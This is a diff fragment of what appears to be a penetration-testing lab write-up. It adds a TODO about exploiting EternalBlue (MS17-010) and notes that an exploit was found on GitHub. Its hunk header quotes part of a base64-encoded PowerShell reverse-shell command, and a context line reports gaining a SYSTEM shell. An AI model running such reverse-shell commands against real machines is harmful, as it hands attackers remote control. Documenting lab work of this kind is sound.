@@ -377,3 +377,13 @@ powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA
 we got a reverse shell as `nt auth/system`.
 
 
+
+> exploiting the eternal blue vuln (MS17-010) - T0DO
+
+![image](https://github.com/user-attachments/assets/eefd389b-659f-4fd3-bf1e-3716d5e96c77)
+
+found an exploit on github 
+
+
+
+
